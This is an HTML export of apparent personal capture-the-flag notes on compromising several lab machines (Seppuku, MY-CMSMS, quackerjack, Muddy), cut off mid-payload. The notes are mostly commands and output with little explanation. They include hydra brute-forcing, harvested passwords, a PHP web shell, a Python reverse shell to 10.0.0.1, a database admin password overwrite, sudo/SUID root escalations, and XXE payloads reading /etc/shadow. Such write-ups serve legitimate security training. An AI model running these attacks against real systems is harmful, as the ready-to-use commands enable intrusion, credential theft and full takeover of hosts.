/><br /><br /><br /><br /><br /><br /><br /><br />hydra -L &quot;users2.txt&quot; -p &quot;password&quot;  -s 8081 127.0.0.1 http-post-form &quot;/login:{\&quot;username\&quot;\:\&quot;^USER^\&quot;,\&quot;password\&quot;\:\&quot;^PASS^\&quot;}:H=Content-Type: application/json:F=Unauthorized&quot; -I -V<br /><br />dev-acct:password<br /></div><div class='page'><h1 class='title level-2'>Seppuku.pg</h1><br/>└─# nmap -A -p- 192.168.223.90<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-17 23:59 +03<br />Nmap scan report for 192.168.223.90<br />Host is up (0.15s latency).<br />Not shown: 65527 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           vsftpd 3.0.3<br />22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)<br />|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)<br />|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)<br />80/tcp   open  http          nginx 1.14.2<br />| http-auth: <br />| HTTP/1.1 401 Unauthorized\x0D<br />|_  Basic realm=Restricted Content<br />|_http-title: 401 Authorization Required<br />139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp  open  netbios-ssn   Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br />7080/tcp open  ssl/empowerid LiteSpeed<br />|_http-server-header: LiteSpeed<br />|_http-title: Did not follow redirect to <a href="https://192.168.223.90:7080/">https://192.168.223.90:7080/</a><br />| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US<br />| Not valid before: 2020-05-13T06:51:35<br />|_Not valid after:  2022-08-11T06:51:35<br />|_ssl-date: 2021-05-17T21:11:57+00:00; -1s from scanner time.<br />| tls-alpn: <br />|   h2<br />|   spdy/3<br />|   spdy/2<br />|_  http/1.1<br />7601/tcp open  http          Apache httpd 2.4.38 ((Debian))<br />|_http-title: Seppuku<br />8088/tcp open  http          LiteSpeed httpd<br />|_http-title: Seppuku<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/18%OT=21%CT=1%CU=31954%PV=Y%DS=2%DC=T%G=Y%TM=60A2DC1<br />OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%<br />OS:T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=<br />OS:N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G<br />OS:)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 59m59s, deviation: 2h00m01s, median: -1s<br />|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.9.5-Debian)<br />|   Computer name: seppuku<br />|   NetBIOS computer name: SEPPUKU\x00<br />|   Domain name: \x00<br />|   FQDN: seppuku<br />|_  System time: 2021-05-17T17:11:50-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-17T21:11:50<br />|_  start_date: N/A<br /><br />TRACEROUTE (using port 143/tcp)<br />HOP RTT       ADDRESS<br />1   147.92 ms 192.168.49.1<br />2   148.01 ms 192.168.223.90<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 738.68 seconds<br /><br /><br /><br />gobuster dir -u <a href="http://192.168.223.90:7601">http://192.168.223.90:7601</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,txt,html -t 40                                                                                1 ⨯<br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://192.168.223.90:7601">http://192.168.223.90:7601</a><br />[+] Threads:        40<br />[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Extensions:     php,txt,html<br />[+] Timeout:        10s<br />===============================================================<br />2021/05/18 00:16:50 Starting gobuster<br />===============================================================<br />/index.html (Status: 200)<br />/b (Status: 301)<br />/a (Status: 301)<br />/c (Status: 301)<br />/t (Status: 301)<br />/r (Status: 301)<br />/d (Status: 301)<br />/e (Status: 301)<br />/f (Status: 301)<br />/h (Status: 301)<br />/w (Status: 301)<br />/q (Status: 301)<br />/database (Status: 301)<br />/production (Status: 301)<br />/keys (Status: 301)<br />/secret (Status: 301)<br />/stg (Status: 301)<br />/server-status (Status: 403)<br />Progress: 116241 / 220561 (52.70%)^C<br />[!] Keyboard interrupt detected, terminating.<br /><br /><br />hydra -l seppuku -P password.lst ssh://192.168.223.90 -I <br />Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br /><br />Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-18 00:38:59<br />[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br />[DATA] max 16 tasks per 1 server, overall 16 tasks, 93 login tries (l:1/p:93), ~6 tries per task<br />[DATA] attacking ssh://192.168.223.90:22/<br />[22][ssh] host: 192.168.223.90   <strong>login: seppuku   password: eeyoree</strong><br />1 of 1 target successfully completed, 1 valid password found<br /><br />seppuku@seppuku:~$ cat .passwd<br />12345685213456!@!@A<br /><br /><strong>samurai:12345685213456!@!@A</strong><br /><br /><br />User samurai may run the following commands on seppuku:<br />    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*<br />    <br />private key is used for other user tanto (found in folder with gobuster)<br /><br />make  bin file<br />#!/bin/bash<br />ls -la $1;<br />cp /bin/bash .;<br />chmod +s bash;<br /><br />run as samurai sudo<br /><br />run bash -p<br />#whoami<br />root<br /></div><div class='page'><h1 class='title level-2'>MY-CMSMS.pg</h1><br/>┌──(root💀kali)-[/home/kali]<br />└─# rustscan -a  192.168.80.74  --range 1-65535 --ulimit 5000 -- -A <br />.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br />| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |<br />| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br />`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;<br />The Modern Day Port Scanner.<br />________________________________________<br />: <a href="https://discord.gg/GFrQsGy">https://discord.gg/GFrQsGy</a>           :<br />: <a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> :<br /> --------------------------------------<br />Real hackers hack time ⌛<br /><br />[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br />[~] Automatically increasing ulimit value to 5000.<br />Open 192.168.80.74:22<br />Open 192.168.80.74:80<br />[~] Starting Script(s)<br />[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)<br /><br />[~] Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-07 20:59 +03<br />NSE: Loaded 153 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />Initiating Ping Scan at 20:59<br />Scanning 192.168.80.74 [4 ports]<br />Completed Ping Scan at 20:59, 0.20s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 20:59<br />Completed Parallel DNS resolution of 1 host. at 20:59, 0.02s elapsed<br />DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br />Initiating SYN Stealth Scan at 20:59<br />Scanning 192.168.80.74 [2 ports]<br />Discovered open port 80/tcp on 192.168.80.74<br />Discovered open port 22/tcp on 192.168.80.74<br />Completed SYN Stealth Scan at 20:59, 0.19s elapsed (2 total ports)<br />Initiating Service scan at 20:59<br />Scanning 2 services on 192.168.80.74<br />Completed Service scan at 20:59, 6.64s elapsed (2 services on 1 host)<br />Initiating OS detection (try #1) against 192.168.80.74<br />Retrying OS detection (try #2) against 192.168.80.74<br />Initiating Traceroute at 20:59<br />Completed Traceroute at 20:59, 0.17s elapsed<br />Initiating Parallel DNS resolution of 2 hosts. at 20:59<br />Completed Parallel DNS resolution of 2 hosts. at 20:59, 0.05s elapsed<br />DNS resolution of 2 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]<br />NSE: Script scanning 192.168.80.74.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 5.85s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.66s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />Nmap scan report for 192.168.80.74<br />Host is up, received echo-reply ttl 63 (0.16s latency).<br />Scanned at 2021-09-07 20:59:04 +03 for 19s<br /><br />PORT   STATE SERVICE REASON         VERSION<br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDO2NZpyWvmlp9n32GhuHX86ickyFyeoh/ESBEKFDQ2bKtYB5ql158CM+zuXjQsIdmLUFtpbmMjl4nArC3d6Z/IJYgHIhA1wM6NA9ErQsYVdQEJS6Bb6rE1PLPCsF5wNWvTW9PMdQtPuFj4rJM+FWZffzUZGQoHz/YMf5IJxdz7Xf1i/G7BvANctULMC7rKqpXvpjxTcLPfxxuO7ePcsMPco0T8ZDw93k4K65upASBqbdzCS9axTf5JXll3nWGcKO/JfWk3dvDUpRWdcUpXoEf2+afEzW5deUFY6O1dDaGmeWEjTvTG1Bo2qUTLr43T8w234I7qqgiMmnXjP+TVgOPP<br />|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLHPnZ54xfYtmNSBROqyDaS91lnDbroaBWi+KHR0cRbWxYSzW0G5IxmT19UjfBJOiG7lanOJw5dtC1pmeU2/ywI=<br />|   256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGAbYacAnCI/PmYwQeSFp6RcW3ZCCqIAzSIiec9ck725<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))<br />|_http-favicon: Unknown favicon MD5: 551E34ACF2930BF083670FA203420993<br />|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Home - My CMS<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.7 (90%), Linux 4.4 (90%), Synology DiskStation Manager 5.1 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=9/7%OT=22%CT=%CU=31257%PV=Y%DS=2%DC=T%G=N%TM=6137A87B%P=x86_64-pc-linux-gnu)<br />SEQ(SP=103%GCD=1%ISR=10D%TI=Z%II=I%TS=A)<br />OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)<br />WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br />ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Uptime guess: 17.384 days (since Sat Aug 21 11:46:37 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=259 (Good luck!)<br />IP ID Sequence Generation: All zeros<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 80/tcp)<br />HOP RTT       ADDRESS<br />1   162.60 ms 192.168.49.1<br />2   152.54 ms 192.168.80.74<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 20:59<br />Completed NSE at 20:59, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds<br />           Raw packets sent: 78 (5.316KB) | Rcvd: 38 (5.548KB)<br /><br /><br /><br /><br />mysql -h <a href="http://192.168.80.74">192.168.80.74</a> -u root -p<br />root:root<br /><br /><br />update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#39;sitemask&#39;),&#39;&#39;),&#39;whiskey&#39;))) where username = &#39;admin&#39;; <br /><br />it adds SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#39;sitemask&#39;) which is “a235561351813137” to the string then takes md5 to create a password.<br /><br />upload .phtml file with php inside<br /><br />&lt;?php system($_GET[cmd]);?&gt;<br />python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br />python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;<br /><br /><img src="images/58-1.png" alt="images/58-1.png" /><br /><br />armour:Shield@123<br /><br /><br />User armour may run the following commands on mycmsms:                                                                                                                                                                                                        <br />    (root) NOPASSWD: /usr/bin/python<br />    <br />    <br />sudo /usr/bin/python -c ‘import os;os.system(&quot;/bin/bash&quot;)’<br />whoami<br />root</div><div class='page'><h1 class='title level-2'>quackerjack.pg</h1><br/><br />PORT     STATE SERVICE     REASON         VERSION                                                                             <br />21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.2                                                                        <br />| ftp-syst:                                                                                                                   <br />|   STAT:                                                                                                                     <br />| FTP server status:                                                                                                          <br />|      Connected to ::ffff:192.168.49.55                                                                                      <br />|      Logged in as ftp                                                                                                       <br />|      TYPE: ASCII                                                                                                            <br />|      No session bandwidth limit                                                                                             <br />|      Session timeout in seconds is 300                                                                                      <br />|      Control connection is plain text                                                                                       <br />|      Data connections will be plain text                                                                                    <br />|      At session startup, client count was 3                  <br />|      vsFTPd 3.0.2 - secure, fast, stable                                                                                    <br />|_End of status                                                                                                               <br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                        <br />|_Can&#39;t get directory listing: TIMEOUT                                                                                        <br />22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)                                                          <br />| ssh-hostkey:                                                                                                                <br />|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)                                                                <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCWsUPf+lVe3JddBDNBbM3vSxW2Nbl7ZniBHSy2r7B9KN42uteBJeZtPoxcBGPEcUv4ZZQ7CrIyKEqNjpz4QfryIb9Ta4ehTJNumQCXV2r2VsLDYCK0C+FjOwc++o/iqUOPm48NNO3s//vhb33VZ1g5dnEnXQ68jdJ3G382+cVfcWj6WSZLS1hk7HLq2lYrTZD6krJ1eEZxgIb6YiXnSru<br />EtntEpiEy5c92yh3KFnvVhgwNJe/WyNpXLrE4I66lX5EWhTAhw/6373RL/3efGsptmwhb7wrMXdscic/JOmUMUKYPRVl7KGMik0kjVH/rXpEpTjUONQ+3DhuT7khuB5MF<br />|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)                                                                                                                                                                                              <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMT94WFh/L5UMkSoHb0Obh3JTETeKzHNMKfnuJleky0X/AEbM+TV5WCsd7GcWfhfsFxK1xyK9iyNzmKmShy3Fk8=                                                                                           <br />|   256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)                                                             <br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIANg5sdcd3U3DkheWc10jhSTJbOSE7Lqtyu+yQhLuywl                                                                                                                                                                           <br />80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)                        <br />|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16                                                    <br />|_http-title: Apache HTTP Server Test Page powered by CentOS                                                                  <br />| http-methods:                                                                                                                                                                                                                                              <br />|   Supported Methods: GET HEAD POST OPTIONS TRACE                                                                            <br />|_  Potentially risky methods: TRACE                                                                                          <br />111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)                                                                   <br />| rpcinfo:                                                                                                                    <br />|   program version    port/proto  service                                                                                    <br />|   100000  2,3,4        111/tcp   rpcbind                                                                                    <br />|   100000  2,3,4        111/udp   rpcbind                                                                                    <br />|   100000  3,4          111/tcp6  rpcbind                                                                                    <br />|_  100000  3,4          111/udp6  rpcbind                                                                                    <br />139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: SAMBA)                                             <br />445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 (workgroup: SAMBA)                                                <br />8081/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)                        <br />|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16                                                    <br />|_http-title: 400 Bad Request                                                                                                 <br />| http-methods:                                                                                                                                                                                                                                              <br />|_  Supported Methods: GET HEAD POST OPTIONS            <br /><br /><br />8081 rconfig 3.9.4<br /><br />sql injection<br /><br /><br />admin:1:dc40b85276a1f4d7cb35f154236aa1b2<br /><br /><br />admin:abgrtyu<br /><br />rconfig 3.9.4 upload php vuln vendors.php<br /><br />linpeas.sh ⇒ find suid<br /><br /><br />./find . -exec /bin/sh -p \; -quit<br /><br />whoami<br />root</div><div class='page'><h1 class='title level-2'>Muddy.pg</h1><br/><br />PORT     STATE  SERVICE REASON         VERSION                                                                                                                                                                                                                <br />22/tcp   open   ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                                         <br />| ssh-hostkey:                                                                                                                                                                                                                                                <br />|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r<br />|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=<br />|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+<br />25/tcp   open   smtp    syn-ack ttl 63 Exim smtpd<br />| smtp-commands: muddy Hello nmap.scanme.org [192.168.49.250], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, <br />|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP <br />80/tcp   open   http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))<br />| http-methods:                                                <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Did not follow redirect to <a href="http://muddy.ugc/">http://muddy.ugc/</a><br />111/tcp  open   rpcbind syn-ack ttl 63 2-4 (RPC #100000)<br />| rpcinfo:                                                     <br />|   program version    port/proto  service<br />|   100000  2,3,4        111/tcp   rpcbind<br />|   100000  2,3,4        111/udp   rpcbind<br />|   100000  3,4          111/tcp6  rpcbind<br />|_  100000  3,4          111/udp6  rpcbind<br />443/tcp  closed https   reset ttl 63<br />8888/tcp open   http    syn-ack ttl 63 WSGIServer 0.1 (Python 2.7.16)<br />| http-methods:                                                <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-server-header: WSGIServer/0.1 Python/2.7.16<br />|_http-title: Ladon Service Catalog<br /><br /><br /><br /><br /><br />port 8888:<a href="https://www.exploit-db.com/exploits/43113">https://www.exploit-db.com/exploits/43113</a><br /><br /><br /><br /><br /><br />curl -s -X $&#39;POST&#39; \<br />-H $&#39;Content-Type: text/xml;charset=UTF-8&#39; \<br />-H $&#39;SOAPAction: \&quot;<a href="http://muddy.ugc:8888/muddy/soap11/checkout\"'">http://muddy.ugc:8888/muddy/soap11/checkout\&quot;&#39;</a> \<br />--data-binary $&#39;&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE uid<br />[&lt;!ENTITY passwd SYSTEM &quot;file:///etc/shadow&quot;&gt;<br />]&gt;<br />&lt;soapenv:Envelope xmlns:xsi=\&quot;<a href="http://www.w3.org/2001/XMLSchema-instance\"">http://www.w3.org/2001/XMLSchema-instance\&quot;</a><br />xmlns:xsd=\&quot;<a href="http://www.w3.org/2001/XMLSchema\"">http://www.w3.org/2001/XMLSchema\&quot;</a><br />xmlns:soapenv=\&quot;<a href="http://schemas.xmlsoap.org/soap/envelope/\"">http://schemas.xmlsoap.org/soap/envelope/\&quot;</a><br />xmlns:urn=\&quot;urn:muddy\&quot;&gt;&lt;soapenv:Header/&gt;<br />&lt;soapenv:Body&gt;<br />&lt;urn:checkout soapenv:encodingStyle=\&quot;<a href="http://schemas.xmlsoap.org/soap/encoding/\">">http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;</a><br />&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;<br />&lt;/urn:checkout&gt;<br />&lt;/soapenv:Body&gt;<br />&lt;/soapenv:Envelope&gt;&#39; \<br />&#39;<a href="http://muddy.ugc:8888/muddy/soap11'">http://muddy.ugc:8888/muddy/soap11&#39;</a> | xmllint --format -<br /><br /><br />&lt;result&gt;Serial number: <br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/<br />syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:<br />man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:<br />nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-time<br />sync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br />systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br />systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br />messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br />sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br />systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br />mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false<br />ian:x:1000:1000::/home/ian:/bin/sh<br />Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin<br />_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologin<br />statd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin&lt;/result&gt;<br /><br /><br /><br />curl -s -X $&#39;POST&#39; \<br />-H $&#39;Content-Type: text/xml;charset=UTF-8&#39; \<br />-H $&#39;SOAPAction: \&quot;<a href="http://muddy.ugc:8888/muddy/soap11/checkout\"'">http://muddy.ugc:8888/muddy/soap11/checkout\&quot;&#39;</a> \<br />--data-binary $&#39;&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE uid<br />[&lt;!ENTITY passwd SYSTEM &quot;<span style="color:#ffff00;">file:///var/www/html/webdav/passwd.dav</span>&quot;&gt;<br />]&gt;<br />&lt;soapenv:Envelope xmlns:xsi=\&quot;<a href="http://www.w3.org/2001/XMLSchema-instance\"">http://www.w3.org/2001/XMLSchema-instance\&quot;</a><br />xmlns:xsd=\&quot;<a href="http://www.w3.org/2001/XMLSchema\"">http://www.w3.org/2001/XMLSchema\&quot;</a><br />xmlns:soapenv=\&quot;<a href="http://schemas.xmlsoap.org/soap/envelope/\"">http://schemas.xmlsoap.org/soap/envelope/\&quot;</a><br />xmlns:urn=\&quot;urn:muddy\&quot;&gt;&lt;soapenv:Header/&gt;<br 